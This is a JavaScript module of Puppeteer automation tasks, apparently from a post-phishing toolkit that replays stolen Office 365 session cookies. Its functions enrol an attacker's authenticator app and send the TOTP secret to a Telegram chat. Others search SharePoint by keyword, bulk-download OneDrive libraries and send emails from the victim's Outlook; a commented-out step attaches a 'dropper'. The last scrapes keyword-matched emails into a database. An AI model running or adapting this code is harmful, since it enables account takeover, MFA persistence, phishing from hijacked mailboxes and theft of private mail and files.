const necrohelp = require('../../tasks/helpers/necrohelp')
const db = require('../../db/db')
const clusterLib = require('../../puppeteer/cluster')
const fs = require('fs')
const TelegramBot = require('node-telegram-bot-api');

exports.AddAuthenticatorApp = async ({ page, data: [taskId, cookies, params] }) => {
    const token = params.telegramToken;
    const bot = new TelegramBot(token, {polling: false});
    const chatId = params.telegramChatId;

    // Send notification via Telegram bot:
    for(let id of chatId){
        bot.sendMessage(id, `Instrumentation #${taskId} started`);
    }

    // this is constant
    const nextButtonSelector = "div.ms-Dialog-actionsRight > span:nth-child(2) > button"

    await db.UpdateTaskStatus(taskId, "running")

    await page.setCookie(...cookies);
    await page.goto(params.fixSession);
    //await necrohelp.ScreenshotCurrentPage(page, taskId)
    await necrohelp.Sleep(5000)

    // Get "+ Add Sign-in method" and click on it
    const assSignIn = await page.waitForSelector('i[data-icon-name="Add"]');
    if(assSignIn !== null){
        await assSignIn.click()
    }

    await necrohelp.Sleep(3000)

    //check for modal dialog open and get DropDown Menu, clicking on it
    const modalDiag = await page.waitForSelector('div.ms-Dropdown-container')
    if(modalDiag !== null){
        await modalDiag.click()
    }
    await necrohelp.Sleep(1000)

    //Select the first dropdown option, Authenticator App
    await page.click('div.ms-Callout-main > div > div > button').catch(console.error)
    await necrohelp.Sleep(1000)

    // click on Add
    await page.click(nextButtonSelector).catch(console.error)
    await necrohelp.Sleep(1000)

    // Click on "I want to use a different authenticator app"
    await page.click('div.ms-Dialog-content > div > div:nth-child(1) > div > div > button').catch(console.error)
    await necrohelp.Sleep(1000)

    // click on Next
    await page.click(nextButtonSelector).catch(console.error)
    await necrohelp.Sleep(3000)

    // click on "Can't Scan Image"
    await page.click('div.ms-Dialog-content > div > div > div > div > div:nth-child(4) > button').catch(console.error)
    await necrohelp.Sleep(1000)

    const accountName = await page.evaluate('document.querySelector("div.ms-Dialog-content > div > div > div > div > div:nth-child(6) > span").innerText');
    const secretKey = await page.evaluate('document.querySelector("div.ms-Dialog-content > div > div > div > div > div:nth-child(7) > span").innerText');

    const msg_notification = `[${taskId}] New Authenticator App accountName: ${accountName} with secretKey: ${secretKey}`;
    console.log(msg_notification)

    // click on Next
    await page.click(nextButtonSelector).catch(console.error)
    await necrohelp.Sleep(2000)

    // get the OTP from the secretKey using totp-generator
    const totp = await necrohelp.Totp(secretKey)
    console.log(`[${taskId}] Generated OTP from secretKey ${secretKey}: ${totp}`)

    // type the OTP in the input field
    const input = 'div.ms-Dialog-content > div > div > div > div:nth-child(2) > div:nth-child(3) > div > div > input';
    await page.type(input, totp, {delay: 300}).catch(console.error)

    await necrohelp.Sleep(2000)

    // click on Next
    await page.click(nextButtonSelector).catch(console.error)
    await necrohelp.Sleep(5000)

    await db.UpdateTaskStatus(taskId, "completed")


    // Send notification via Telegram bot:
    for(let id of chatId){
        bot.sendMessage(id, msg_notification);
    }
}

exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
    // update initial task status from queued to running
    await db.UpdateTaskStatus(taskId, "running")

    // NOTE: cookies from office365.com as well as .login.microsoftonline.com need to be passed to have full Office control
    /// otherwise we loose the session on app switch. a total of 37 cookies need to be passed!!!
    await page.setCookie(...cookies);

    await page.goto(params.fixSession);
    //await necrohelp.ScreenshotCurrentPage(page, taskId)
    await necrohelp.Sleep(2000)

    // check if we are logged in and the cookies set are all fine
    const loggedInSelector = 'document.querySelector("#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365")';
    const waffle = await page.evaluate(loggedInSelector);
    console.log(`[${taskId}] session is invoked correctly. Apps waffle found: ${waffle}`)

    await necrohelp.ScreenshotCurrentPage(page, taskId)

    // waffle click
    await page.click('#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365').catch(console.error)
    console.log(`[${taskId}] clicking on o365 Apps waffle`)
    await necrohelp.Sleep(2000)

    // click on sharepoint
    await page.click('#O365_AppTile_Sites > .o365sx-neutral-dark-font > span').catch(console.error)
    console.log(`[${taskId}] loading microsoft Sharepoint`)
    await necrohelp.Sleep(2000)
    await necrohelp.ScreenshotCurrentPage(page, taskId)

    // click on teams
    await page.click('#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365').catch(console.error)
    await necrohelp.Sleep(2000)
    await page.click('#O365_AppTile_SkypeTeams > .o365cs-base > span').catch(console.error)
    console.log(`[${taskId}] loading microsoft Teams`)
    await necrohelp.Sleep(5000)
    await page.click('.use-app-lnk').catch(console.error) // click on Use we WebApp
    await necrohelp.Sleep(5000)
    await necrohelp.ScreenshotCurrentPage(page, taskId)

    await db.UpdateTaskStatus(taskId, "completed")
}

exports.SharepointExtrude = async ({ page, data: [taskId, cookies, params] }) => {
    await page.setCookie(...cookies);

    await page.goto(params.fixSession);
    await necrohelp.Sleep(2000)

    // check if we are logged in and the cookies set are all fine
    const loggedInSelector = 'document.querySelector("#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365")';
    const waffle = await page.evaluate(loggedInSelector);
    console.log(`[${taskId}] session is invoked correctly. Apps waffle found: ${waffle}`)

    // waffle click
    await page.click('#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365').catch(console.error)
    console.log(`[${taskId}] clicking on o365 Apps waffle`)
    await necrohelp.Sleep(2000)

    // click on sharepoint
    await page.click('#O365_AppTile_Sites > .o365sx-neutral-dark-font > span').catch(console.error)
    console.log(`[${taskId}] loading microsoft Sharepoint`)
    await necrohelp.Sleep(2000)

   // loop for keywords and open N tabs
    let urlsMatchingKeys = [];
    for(let keyword of params.keywords){

      // TODO make this configurable ofc!
      let url = `https://penitenziagite.sharepoint.com/_layouts/15/sharepoint.aspx?q=${keyword}&v=search`
      await page.goto(url)
      await necrohelp.Sleep(4000)

        // get all links matching the search
        // TODO handle pagination if present
      let links = await page.$$('ol[data-searchpanelcontenttype="body"] > li > div > article > div > div > header > h3').catch(console.error)
        console.log(`[${taskId}] searching Sharepoint for ${keyword}. found items: ${links.length}`)

        for(let link of links){
          let href = await link.$eval('a', element => element.getAttribute('href')).catch(console.error)
          console.log(`[${taskId}]    matching item link: ${href}`)
          urlsMatchingKeys.push(href);
      }
    }

    // fetch all the discovered items
    console.log(`[${taskId}]  Found a total of ${urlsMatchingKeys.length} items matching provided keywords. Now fetching...`)
    for(let url of urlsMatchingKeys){
        await page.goto(url)
        await necrohelp.Sleep(2000)

        if(url.includes('/Doc.aspx?')){
            // Office document (word, excel..). we instrument the Save As to download the document as file
            await necrohelp.Sleep(2000)

            console.log(`[${taskId}] exporting office file...`)

            // gets the fullpage Iframe contents
            const elementHandle = await page.$('#WebApplicationFrame').catch(console.error)
            const appIframe = await elementHandle.contentFrame()
            console.log(`[${taskId}]    elementHandle: ${elementHandle}`)
            console.log(`[${taskId}]    appIframe: ${appIframe}`)

            // we work on the iframe DOM not the outer page..~!
            const main = await appIframe.$('#MainApp').catch(console.error)
            console.log(`[${taskId}]    MainApp: ${main}`)

            const inner = await main.$('#applicationOuterContainer > form').catch(console.error)
            console.log(`[${taskId}]    inner: ${inner}`)

            // TODO continue the nested selection and click on File -> Save As..
            await necrohelp.Sleep(2000)

           // await main.click('#TabListContainer > div > button').catch(console.error)

        }

        await necrohelp.ScreenshotCurrentPage(page, taskId)

    }

    await db.UpdateTaskStatus(taskId, "completed")

}

exports.OneDriveExtrude = async ({ page, data: [taskId, cookies, params] }) => {
    await page.setCookie(...cookies);

    await page.goto(params.fixSession);
    //await necrohelp.ScreenshotCurrentPage(page, taskId)
    await necrohelp.Sleep(2000)

    // check if we are logged in and the cookies set are all fine
    const loggedInSelector = 'document.querySelector("#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365")';
    const waffle = await page.evaluate(loggedInSelector);
    console.log(`[${taskId}] session is invoked correctly. Apps waffle found: ${waffle}`)

    // waffle click
    await page.click('#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365').catch(console.error)
    console.log(`[${taskId}] clicking on o365 Apps waffle`)
    await necrohelp.Sleep(2000)

    // click on onedrive
    await page.click('#O365_AppTile_Documents').catch(console.error)
    console.log(`[${taskId}] loading microsoft OneDrive`)
    await necrohelp.Sleep(2000)
    await necrohelp.ScreenshotCurrentPage(page, taskId)

    // allow downloads
    await page._client.send('Page.setDownloadBehavior', {behavior: 'allow', downloadPath: './extruded'}).catch(console.error)

    // click on select all in the MyFiles view, and download a ZIP with personal files
    await page.click('div.ms-FocusZone > div > div.ms-DetailsHeader-checkTooltip').catch(console.error)

    await page.waitForSelector('button[name="Download"]');
    // click on select all in the MyFiles view
    await page.click('button[name="Download"]').catch(console.error)

    // allow enough time for the async download to complete
    await necrohelp.Sleep(5000)

    // check how many Shared Libraries we have, and click on each of them downloading files
    let sharedLibs = await page.$$('nav.ms-Nav > div:nth-child(2) > div.ms-Nav-groupContent > ul.ms-Nav-navItems > li').catch(console.error)
    let libsCount = sharedLibs.length - 1 // the last item is Create Shared Library which is a links, so to ignore
    console.log(`[${taskId}] searching OneDrive for additional item libraries. found libs: ${libsCount}`)

    let counter = 0
    while(counter < libsCount){
        let selector = `nav.ms-Nav > div:nth-child(2) > div.ms-Nav-groupContent > ul.ms-Nav-navItems > li:nth-child(${counter+1}) > div > a`
        await page.click(selector).catch(console.error)
        await necrohelp.Sleep(3000)
        await necrohelp.ScreenshotCurrentPage(page, taskId)

        // get library title
        let tt = await page.$('ul.BreadcrumbBar-list > li:nth-child(1)').catch(console.error)
        let title = await tt.$eval('a', element => element.getAttribute('title')).catch(console.error)

        // click on select all in the current library view, and download a ZIP with personal files
        await page.click('div.ms-DetailsList-headerWrapper > div > div').catch(console.error)

        // TODO rewrite SEL in a better wait to wait and return null if element is not found, without displaying the error
        let sel = await page.waitForSelector('button[name="Download"]', { timeout: 2000 }).catch(console.error)
        if(typeof sel !== 'undefined'){
            console.log(`[${taskId}] downloading library "${title}" ...`)
            // click on select all in the MyFiles view
            await page.click('button[name="Download"]').catch(console.error)
            await necrohelp.Sleep(3000)
        }else{
            console.log(`[${taskId}] library "${title}" seems empty, skipping it...`)
        }
        counter++
    }

    await db.UpdateTaskStatus(taskId, "completed")
}

exports.OutlookWriteEmail = async ({ page, data: [taskId, cookies, params] }) => {
    await page.setCookie(...cookies);

    await page.goto(params.fixSession);
    // increase zoom for debugging purposes when running in gui mode
    await necrohelp.SetPageScaleFactor(page, clusterLib.GetConfig().cluster.page.scaleFactor)

    // TODO just for demo purposes wait longer
    await necrohelp.Sleep(2000)

    // check if we are logged in and the cookies set are all fine
    const loggedInSelector = 'document.querySelector("#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365")';
    const waffle = await page.evaluate(loggedInSelector);
    if ((typeof waffle !== 'undefined' && waffle !== null) && params.writeEmail !== 'undefined'){
        console.log(`[${taskId}] session is invoked correctly. app waffle: ${waffle}`)
    }else{
        await db.UpdateTaskStatusWithReason(taskId, "error", "session seems NOT authenticated")
        return
    }

    let emailImp = params.writeEmail;

    await page.click('#app > div > div:nth-child(3) > div > div > div > div > div:nth-child(2) > button').catch(console.error)
    await necrohelp.Sleep(3000)

    let toSelector = 'div[aria-label="Reading Pane"] > div > div > div> div > div> div> div > div > div > div> div> div > div > div > div > div > input'
    let subjectSelector = 'div[aria-label="Reading Pane"] > div > div > div> div > div> div> div:nth-child(2) > div >div > div > div > input'
    let contentSelector = 'div[aria-label="Reading Pane"] > div > div > div> div > div > div:nth-child(2) > div'
    let sendSelector = 'div[aria-label="Reading Pane"] > div > div > div> div > div > div:nth-child(3) > div:nth-child(2) > div > div > span > button'

    console.log(`[${taskId}] invoking new email:\n  to[${emailImp.to}]\n  subj[${emailImp.subject}]`)

    await page.type(toSelector, emailImp.to)
    await necrohelp.Sleep(3000)

    await page.click(subjectSelector).catch(console.error)
    await page.type(subjectSelector, emailImp.subject, {delay: 50})
    await necrohelp.Sleep(3000)

    await page.click(contentSelector).catch(console.error)
    await page.type(contentSelector, emailImp.data, {delay: 50})
    await necrohelp.Sleep(3000)

    // NOTE clicking on the UI in this case is not needed
    //
    // await page.click('i[data-icon-name="Attach"]').catch(console.error)
    // await necrohelp.Sleep(1000)
    // await page.click('.ms-ContextualMenu-Callout > div > div > div > ul > li > button').catch(console.error)
    // await necrohelp.Sleep(1000)

    // TODO handle the attachment position in the HTML content. by default the attachment is added at the start of the email
    // TODO maybe we should just click at the end of the email content before adding the attachment?
    // TODO file upload works great but the div position for the send selector changes so needs to be updated otherwise email send fails
    // if (typeof emailImp.attachment !== 'undefined' && emailImp.attachment !== null){
    //     console.log(`[${taskId}] attaching file ${emailImp.attachment}`)
    //     await page.waitForSelector('input[type=file]');
    //     const fileInput = await page.$('input[type=file]');
    //     await fileInput.uploadFile(emailImp.attachment);
    //     await fileInput.evaluate(upload => upload.dispatchEvent(new Event('change', { bubbles: true })));
    //
    //     // give enough time for file upload if N megabytes fat dropper
    //     await necrohelp.Sleep(5000)
    // }

    // click the send button
    await necrohelp.Sleep(5000)

    await page.click(sendSelector).catch(console.error)
    await necrohelp.Sleep(5000)

    console.log(`[${taskId}] email invoked successfully`)

    // TODO handle the fucking attachment reminder as an extra click if shown - if the pretext
    // has attachment or similar words then you are prompted to add one if not present..lulz
    await db.UpdateTaskStatus(taskId, "completed")

}

exports.OutlookExtrude = async ({ page, data: [taskId, cookies, params] }) => {
    await page.setCookie(...cookies);
    await page.goto(params.fixSession);

    // increase zoom for debugging purposes when running in gui mode
    await necrohelp.SetPageScaleFactor(page, clusterLib.GetConfig().cluster.page.scaleFactor)

    await necrohelp.Sleep(2000)

    // check if we are logged in and the cookies set are all fine
    const loggedInSelector = 'document.querySelector("#O365_MainLink_NavMenu >.ms-Icon--WaffleOffice365")';
    const waffle = await page.evaluate(loggedInSelector);

    if (typeof waffle !== 'undefined' && waffle !== null){
        console.log(`[${taskId}] session is invoked correctly. app waffle: ${waffle}`)
    }else{
        await db.UpdateTaskStatusWithReason(taskId, "error", "session seems NOT authenticated")
        return
    }

    await necrohelp.Sleep(1000)

    let keywords = params.keywords;

    // loop for each keyword we want to search for
    for(let keyword of keywords){

        console.log(`[${taskId}] searching INBOX emails matching "${keyword}"`)
        // click on the search bar, types the keyword, the press enter
        // TODO sometimes this click throws an error...understand why (not blocking though)
        //await page.click('#searchBoxId-Mail input[aria-label="Search"]').catch(console.error)
        await page.type('#searchBoxId-Mail input[aria-label="Search"]', keyword).catch(console.error)
        await necrohelp.Sleep(1000)
        await page.keyboard.press('Enter');
        await necrohelp.Sleep(3000)

        let selector = "div.threeColumnCirclePersonaDivWidth + div";

        let matches = 0 ;
        while (true){
            // The email results are all DIVs next to div.threeColumnCirclePersonaDivWidth (TopResults) so we can just loop adding "+ div"
            // at each iteration until the element length is shorter or null , then stop
            let email = await page.$(selector);
            if (typeof email !== 'undefined' && email !== null){

                // wait at least 2 seconds to give enough time to fat emails to load. Office is not blazing fast
                await page.click(selector).catch(console.error)
                await necrohelp.Sleep(1000)

                let subject = await page.evaluate("document.querySelector(\"div[aria-label='Content pane'] > div span\").textContent").catch(console.error);
                let emailParts = await page.$$('div.wide-content-host div.allowTextSelection').catch(console.error);

                console.log(`[${taskId}]  ${keyword} -> found email w subject "${subject}"`)

                for(let part of emailParts){
                    let html =  await part.$eval('div', (element) => { return element.innerHTML }).catch(console.error);
                    //console.log("HTML DEBUG:\n" + html)
                    let email = { subject: subject, html: html }
                    let emailJson = JSON.stringify(email, null, 4);
                    let emailBlob = await Buffer.from(emailJson).toString('base64');

                    await fs.writeFile(`${clusterLib.GetConfig().platform.extrusionPath}/email_${taskId}_${Date.now()}.html`, html, function(err) {
                        if(err){console.log("error savig email to file: " + err)}
                    });
                    let key = `email_${keyword}_${matches}`
                    await db.AddExtrudedData(taskId, key, emailBlob)
                }

                // update selector to go for next div
                selector += " + div"
                matches += 1
            }else{
                break
            }
        }

        console.log(`[${taskId}] extruded ${matches} emails matching "${keyword}"`)

        // clean the input search field
        const cleanInput = "document.querySelector(\"#searchBoxId-Mail input[aria-label='Search']\").value = \"\"";
        await page.evaluate(cleanInput);
        await necrohelp.Sleep(2000)
    }

    await db.UpdateTaskStatus(taskId, "completed")
}
